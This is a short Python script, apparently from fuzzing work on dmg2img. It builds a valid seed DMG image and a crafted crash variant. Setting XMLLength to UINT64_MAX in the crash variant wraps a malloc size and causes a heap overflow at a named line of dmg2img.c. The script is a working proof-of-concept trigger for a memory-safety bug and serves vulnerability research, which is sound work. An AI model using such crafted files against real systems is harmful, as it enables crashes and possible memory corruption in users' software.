#!/usr/bin/env python3
"""Build a minimal valid DMG seed for dmg2img + a max-XMLLength crash variant.

DMG (UDIF) layout dmg2img expects: a 512-byte big-endian 'koly' trailer at EOF
(Signature 0x6b6f6c79 @off 0, XMLOffset @216, XMLLength @224). To reach the
overflow site (dmg2img.c:233-240) the trailer needs sig=koly + nonzero
XMLOffset/XMLLength; to traverse the plist parse without a spurious NULL-deref
(dmg2img.c:245), the plist must contain plist_begin/<key>blkx</key>/</array>/
</plist>. With max XMLLength (UINT64_MAX), malloc(XMLLength+1) wraps and
plist[XMLLength]='\\0' overflows (ASAN crash at :240).
"""
import struct
from pathlib import Path

WS = Path(__file__).resolve().parent


def make_dmg(xml_len=None):
    plist = b'<plist version="1.0"><key>blkx</key><array></array></plist>'
    pad = b"\x00" * 8                      # so XMLOffset is nonzero
    xml_off, xml_len = len(pad), (xml_len if xml_len is not None else len(plist))
    koly = bytearray(512)
    struct.pack_into(">I", koly, 0, 0x6b6f6c79)   # 'koly'
    struct.pack_into(">Q", koly, 216, xml_off)    # XMLOffset
    struct.pack_into(">Q", koly, 224, xml_len)    # XMLLength
    return pad + plist + bytes(koly)


if __name__ == "__main__":
    (WS / "in").mkdir(exist_ok=True)
    (WS / "in" / "seed.dmg").write_bytes(make_dmg())                 # normal
    (WS / "max.dmg").write_bytes(make_dmg(0xFFFFFFFFFFFFFFFF))       # crash variant
    print("wrote in/seed.dmg (normal) and max.dmg (XMLLength=UINT64_MAX -> ASAN crash)")
